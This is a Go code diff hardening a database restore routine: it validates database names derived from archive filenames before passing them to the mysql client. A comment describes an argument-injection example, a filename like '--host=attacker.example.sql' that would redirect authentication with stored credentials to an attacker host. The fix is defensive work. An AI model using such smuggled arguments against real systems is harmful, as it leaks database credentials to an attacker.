@@ -101,6 +101,17 @@ func (e *Exporter) restoreSQL(ctx context.Context, record *connectors.Record) er
 		targetDB = strings.TrimSuffix(base, ".sql")
 	}
 
+	// The filename comes from the archive and targetDB is appended as the
+	// trailing argv element.  The mysql client parses options anywhere in
+	// argv, so a record named "--host=attacker.example.sql" would override
+	// the -h that precedes it and authenticate against that host with the
+	// credentials from --defaults-extra-file.
+	if targetDB != "" {
+		if err := mysqlconn.ValidDatabaseName(targetDB); err != nil {
+			return fmt.Errorf("restoring %q: %w", record.Pathname, err)
+		}
+	}
+
 	if e.createDB && targetDB != "" {
 		if err := e.createDatabase(ctx, targetDB); err != nil {
 			return fmt.Errorf("creating database %s: %w", targetDB, err)
@@ -143,8 +154,8 @@ func (e *Exporter) restoreSQL(ctx context.Context, record *connectors.Record) er
 }
 
 func (e *Exporter) createDatabase(ctx context.Context, database string) error {
-	if strings.ContainsAny(database, "`\x00") { // prevent injection via backtick or NUL
-		return fmt.Errorf("invalid database name: %q", database)
+	if err := mysqlconn.ValidDatabaseName(database); err != nil {
+		return err
 	}
 
 	pwArg, cleanup, err := e.conn.PasswordFileArg()
